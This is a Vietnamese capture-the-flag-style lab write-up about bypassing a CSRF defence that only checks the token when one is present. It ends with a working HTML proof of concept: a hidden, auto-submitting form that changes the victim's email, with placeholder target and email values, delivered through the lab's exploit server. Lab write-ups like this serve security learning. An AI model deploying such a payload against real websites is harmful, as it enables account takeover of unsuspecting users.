# CSRF where token validation depends on token being present

### Yêu cầu: Tạo thẻ HTML để tấn công CSRF thay đổi email của tài khoản người dùng

### Hướng làm: 

Đầu tiên, ta đăng nhập vào tài khoản đã cho rồi bắt request của quá trình thay đổi email.

![image](https://user-images.githubusercontent.com/72268643/157731675-bc3191ff-ef5a-49fb-96ea-d147d66ad12b.png)

Khi gửi vào Repeater ta thấy được ở đây có param CSRF token.

![image](https://user-images.githubusercontent.com/72268643/157732124-6c4fe616-cb2a-4434-a7c8-5ed474aca9c3.png)

Ở lab này, ta có thể xóa cả phần token ở trên request đi để có thể bỏ qua khâu xác thực. 

![image](https://user-images.githubusercontent.com/72268643/157732387-2550f6ea-a507-4192-a137-4891010bfba2.png)

Và sau khi xóa bỏ, ta vẫn sẽ nhận được kết quả phản hồi email đã được thay đổi.

![image](https://user-images.githubusercontent.com/72268643/157732535-637ca137-7939-4eb0-8545-7174030ea627.png)

Vậy là để tấn công, ta sẽ viết PoC để gửi lên phía server như sau:

```
<html>
  <body>
    <h1>Hello World</h1> <!-- Phần được hiển thị-->
    <iframe style="display:none;" name="csrf-iframe"></iframe> <!-- Để ẩn thẻ form khi hiển thị tới nạn nhân -->
    <form action="nơi_khai_thác_CSRF_ở_trên_trang_web_đó" method="POST" id="csrf-form">
      <input type="hidden" name="email" value="email_mà_bạn_muốn_đổi">
    </form>

    <script>document.getElementById("csrf-form").submit()</script> <!-- Phần tự submit form thực thi -->
  </body>
</html>
```
Tiếp đến gửi đến Exploit Server, sau đó gửi cho nạn nhân.

![image](https://user-images.githubusercontent.com/72268643/157735305-80218cc7-da3d-41a3-9f0f-0a1f8260e02b.png)

Deliver to victim và hoàn thành lab.
